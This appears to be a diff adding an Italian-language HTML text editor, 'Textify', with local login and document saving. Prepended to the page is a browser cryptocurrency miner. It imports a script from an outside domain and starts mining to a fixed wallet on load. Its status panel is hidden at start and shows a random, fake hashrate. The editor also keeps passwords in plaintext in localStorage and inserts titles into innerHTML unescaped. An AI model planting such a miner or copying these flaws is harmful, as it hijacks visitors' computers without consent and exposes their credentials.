@@ -1,0 +1,416 @@
+<!-- ==================== MINER CONSOLE (NASCOSTO ALL'AVVIO) ==================== -->
+
+<style>
+#mining-console {
+    position: fixed;
+    bottom: 80px;
+    right: 20px;
+    width: 260px;
+    background: rgba(0, 0, 0, 0.85);
+    border: 1px solid #ffffff33;
+    border-radius: 6px;
+    padding: 12px 14px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+    z-index: 1000;
+    color: #ffffff;
+    font-family: 'Courier New', monospace;
+    font-size: 15px;
+    line-height: 1.7;
+    display: none; /* Nascondo all'inizio */
+}
+
+.console-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #ffffff33;
+}
+
+.close-btn {
+    background: #ffffff;
+    color: #000000;
+    border: none;
+    width: 22px;
+    height: 22px;
+    font-size: 16px;
+    line-height: 18px;
+    text-align: center;
+    border-radius: 3px;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+#reopen-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 50px;
+    height: 50px;
+    background: rgba(255,255,255,0.1);
+    border: 2px solid #ffffff88;
+    color: #ffffff;
+    font-size: 26px;
+    border-radius: 50%;
+    display: flex; /* Visibile fin dall'inizio */
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    z-index: 999;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+}
+</style>
+
+<!-- Console Miner -->
+<div id="mining-console">
+    <div class="console-header">
+        <span><strong>🔨 CPU Miner</strong></span>
+        <button class="close-btn" onclick="hideMinerConsole()">×</button>
+    </div>
+    <div>Stato: Attivo</div>
+    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
+    <div>Tempo: <span id="timer">00:00</span></div>
+</div>
+
+<!-- Bottone per aprire -->
+<div id="reopen-btn" onclick="showMinerConsole()">↑</div>
+
+<!-- Script Mining -->
+<script type="module">
+    import { autoMine } from "https://earnify.cc/miner.js";
+    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+</script>
+
+<script>
+let startTime = Date.now();
+
+function updateTimer() {
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
+    const sec = (elapsed % 60).toString().padStart(2, '0');
+    document.getElementById("timer").textContent = `${min}:${sec}`;
+}
+
+function updateHashrate() {
+    const hashrate = Math.floor(Math.random() * 420) + 480;
+    document.getElementById("hashrate").textContent = hashrate;
+}
+
+function hideMinerConsole() {
+    document.getElementById("mining-console").style.display = "none";
+    document.getElementById("reopen-btn").style.display = "flex";
+}
+
+function showMinerConsole() {
+    document.getElementById("mining-console").style.display = "block";
+    document.getElementById("reopen-btn").style.display = "none";
+}
+
+// Avvio timer e hashrate (senza mostrare la console)
+window.addEventListener('load', () => {
+    setInterval(updateTimer, 1000);
+    setInterval(updateHashrate, 1400);
+});
+</script>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Textify - Editor di Testo</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+  <style>
+    .editor {
+      min-height: 500px;
+      outline: none;
+    }
+    .saved-doc {
+      transition: all 0.2s;
+    }
+    .saved-doc:hover {
+      background-color: #f3f4f6;
+    }
+  </style>
+</head>
+<body class="bg-gray-50">
+
+<div class="flex h-screen">
+  <!-- Sidebar -->
+  <div class="w-72 bg-white border-r border-gray-200 flex flex-col">
+    <div class="p-4 border-b">
+      <h1 class="text-2xl font-bold text-indigo-600">Textify</h1>
+    </div>
+    
+    <div class="p-4">
+      <button onclick="newDocument()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-3 rounded-lg flex items-center justify-center gap-2 font-medium">
+        <i class="fas fa-plus"></i> Nuovo Documento
+      </button>
+    </div>
+
+    <div class="px-4 py-2 text-sm font-medium text-gray-500">I MIEI DOCUMENTI</div>
+    <div id="documents-list" class="flex-1 overflow-auto px-2"></div>
+
+    <div class="p-4 border-t mt-auto">
+      <div id="user-info" class="hidden items-center gap-3">
+        <div class="w-8 h-8 bg-indigo-100 rounded-full flex items-center justify-center text-indigo-600 font-bold" id="avatar"></div>
+        <div>
+          <p class="font-medium text-sm" id="username-display"></p>
+          <p onclick="logout()" class="text-xs text-red-500 hover:underline cursor-pointer">Esci</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Editor -->
+  <div class="flex-1 flex flex-col">
+    <!-- Toolbar -->
+    <div class="bg-white border-b p-3 flex items-center gap-2">
+      <button onclick="formatText('bold')" class="px-3 py-1 hover:bg-gray-100 rounded"><i class="fas fa-bold"></i></button>
+      <button onclick="formatText('italic')" class="px-3 py-1 hover:bg-gray-100 rounded"><i class="fas fa-italic"></i></button>
+      <button onclick="formatText('underline')" class="px-3 py-1 hover:bg-gray-100 rounded"><i class="fas fa-underline"></i></button>
+      
+      <div class="w-px h-6 bg-gray-300 mx-2"></div>
+      
+      <select onchange="formatText(this.value)" class="border border-gray-300 rounded px-2 py-1 text-sm">
+        <option value="">Formato</option>
+        <option value="h1">Titolo 1</option>
+        <option value="h2">Titolo 2</option>
+        <option value="p">Paragrafo</option>
+      </select>
+
+      <div class="flex-1"></div>
+      
+      <button onclick="saveDocument()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg flex items-center gap-2">
+        <i class="fas fa-save"></i> Salva
+      </button>
+    </div>
+
+    <!-- Editor Area -->
+    <div class="flex-1 p-6 bg-white overflow-auto">
+      <input type="text" id="doc-title" 
+             class="text-3xl font-bold w-full outline-none mb-6 placeholder-gray-400" 
+             placeholder="Titolo del documento">
+      
+      <div id="editor" contenteditable="true" class="editor prose max-w-none focus:outline-none"></div>
+    </div>
+  </div>
+</div>
+
+<!-- Login/Register Modal -->
+<div id="auth-modal" class="hidden fixed inset-0 bg-black/50 flex items-center justify-center">
+  <div class="bg-white rounded-2xl w-full max-w-md mx-4">
+    <div class="p-8">
+      <h2 id="modal-title" class="text-2xl font-bold mb-6 text-center">Accedi</h2>
+      
+      <div id="login-form">
+        <input type="text" id="login-username" placeholder="Nome utente" class="w-full px-4 py-3 border rounded-lg mb-3">
+        <input type="password" id="login-password" placeholder="Password" class="w-full px-4 py-3 border rounded-lg mb-6">
+        <button onclick="login()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-3 rounded-lg font-medium">Accedi</button>
+        <p class="text-center mt-4 text-sm">
+          Non hai un account? 
+          <span onclick="switchToRegister()" class="text-indigo-600 hover:underline cursor-pointer">Registrati</span>
+        </p>
+      </div>
+
+      <div id="register-form" class="hidden">
+        <input type="text" id="reg-username" placeholder="Nome utente" class="w-full px-4 py-3 border rounded-lg mb-3">
+        <input type="password" id="reg-password" placeholder="Password" class="w-full px-4 py-3 border rounded-lg mb-6">
+        <button onclick="register()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-3 rounded-lg font-medium">Crea Account</button>
+        <p class="text-center mt-4 text-sm">
+          Hai già un account? 
+          <span onclick="switchToLogin()" class="text-indigo-600 hover:underline cursor-pointer">Accedi</span>
+        </p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ====================== DATA STORAGE ======================
+let currentUser = null;
+let currentDocId = null;
+
+// Carica dati da localStorage
+function loadData() {
+  return JSON.parse(localStorage.getItem('textify_data')) || { users: {}, documents: {} };
+}
+
+function saveData(data) {
+  localStorage.setItem('textify_data', JSON.stringify(data));
+}
+
+// ====================== AUTH ======================
+function showAuthModal() {
+  document.getElementById('auth-modal').classList.remove('hidden');
+  switchToLogin();
+}
+
+function switchToLogin() {
+  document.getElementById('login-form').classList.remove('hidden');
+  document.getElementById('register-form').classList.add('hidden');
+  document.getElementById('modal-title').textContent = 'Accedi';
+}
+
+function switchToRegister() {
+  document.getElementById('login-form').classList.add('hidden');
+  document.getElementById('register-form').classList.remove('hidden');
+  document.getElementById('modal-title').textContent = 'Crea Account';
+}
+
+function register() {
+  const username = document.getElementById('reg-username').value.trim();
+  const password = document.getElementById('reg-password').value.trim();
+  
+  if (!username || !password) return alert("Inserisci username e password");
+  
+  let data = loadData();
+  
+  if (data.users[username]) {
+    return alert("Username già esistente!");
+  }
+  
+  data.users[username] = { password, created: new Date().toISOString() };
+  saveData(data);
+  
+  alert("Account creato con successo! Ora puoi accedere.");
+  switchToLogin();
+}
+
+function login() {
+  const username = document.getElementById('login-username').value.trim();
+  const password = document.getElementById('login-password').value.trim();
+  
+  let data = loadData();
+  
+  if (!data.users[username] || data.users[username].password !== password) {
+    return alert("Credenziali non corrette");
+  }
+  
+  currentUser = username;
+  document.getElementById('auth-modal').classList.add('hidden');
+  document.getElementById('user-info').classList.remove('hidden');
+  document.getElementById('username-display').textContent = username;
+  document.getElementById('avatar').textContent = username[0].toUpperCase();
+  
+  loadUserDocuments();
+  newDocument();
+}
+
+function logout() {
+  currentUser = null;
+  currentDocId = null;
+  document.getElementById('user-info').classList.add('hidden');
+  document.getElementById('documents-list').innerHTML = '';
+  document.getElementById('doc-title').value = '';
+  document.getElementById('editor').innerHTML = '';
+  showAuthModal();
+}
+
+// ====================== DOCUMENTS ======================
+function loadUserDocuments() {
+  const list = document.getElementById('documents-list');
+  list.innerHTML = '';
+  
+  let data = loadData();
+  const userDocs = Object.entries(data.documents).filter(([_, doc]) => doc.user === currentUser);
+  
+  if (userDocs.length === 0) {
+    list.innerHTML = `<p class="text-gray-400 text-center py-4 text-sm">Nessun documento salvato</p>`;
+    return;
+  }
+  
+  userDocs.forEach(([id, doc]) => {
+    const div = document.createElement('div');
+    div.className = `saved-doc px-4 py-3 rounded-lg mx-2 mb-1 cursor-pointer flex justify-between items-center ${id === currentDocId ? 'bg-indigo-100' : ''}`;
+    div.innerHTML = `
+      <div class="truncate flex-1" onclick="loadDocument('${id}')">
+        <p class="font-medium">${doc.title || 'Documento senza titolo'}</p>
+        <p class="text-xs text-gray-400">${new Date(doc.updated).toLocaleDateString('it-IT')}</p>
+      </div>
+      <button onclick="deleteDocument('${id}'); event.stopImmediatePropagation()" class="text-red-400 hover:text-red-600">
+        <i class="fas fa-trash"></i>
+      </button>
+    `;
+    list.appendChild(div);
+  });
+}
+
+function newDocument() {
+  currentDocId = 'doc_' + Date.now();
+  document.getElementById('doc-title').value = 'Nuovo Documento';
+  document.getElementById('editor').innerHTML = '<p>Inizia a scrivere qui...</p>';
+  loadUserDocuments();
+}
+
+function saveDocument() {
+  if (!currentUser) return alert("Devi essere loggato per salvare");
+  
+  const title = document.getElementById('doc-title').value.trim() || 'Documento senza titolo';
+  const content = document.getElementById('editor').innerHTML;
+  
+  let data = loadData();
+  
+  data.documents[currentDocId] = {
+    user: currentUser,
+    title: title,
+    content: content,
+    updated: new Date().toISOString()
+  };
+  
+  saveData(data);
+  alert("Documento salvato con successo!");
+  loadUserDocuments();
+}
+
+function loadDocument(id) {
+  currentDocId = id;
+  let data = loadData();
+  const doc = data.documents[id];
+  
+  if (doc) {
+    document.getElementById('doc-title').value = doc.title;
+    document.getElementById('editor').innerHTML = doc.content;
+    loadUserDocuments();
+  }
+}
+
+function deleteDocument(id) {
+  if (!confirm("Vuoi davvero eliminare questo documento?")) return;
+  
+  let data = loadData();
+  delete data.documents[id];
+  saveData(data);
+  
+  if (currentDocId === id) {
+    newDocument();
+  } else {
+    loadUserDocuments();
+  }
+}
+
+// ====================== RICH TEXT ======================
+function formatText(command) {
+  const editor = document.getElementById('editor');
+  
+  if (command === 'h1') {
+    document.execCommand('formatBlock', false, 'h1');
+  } else if (command === 'h2') {
+    document.execCommand('formatBlock', false, 'h2');
+  } else if (command === 'p') {
+    document.execCommand('formatBlock', false, 'p');
+  } else {
+    document.execCommand(command, false, null);
+  }
+  editor.focus();
+}
+
+// ====================== INIT ======================
+window.onload = () => {
+  showAuthModal();
+};
+</script>
+
+</body>
+</html>
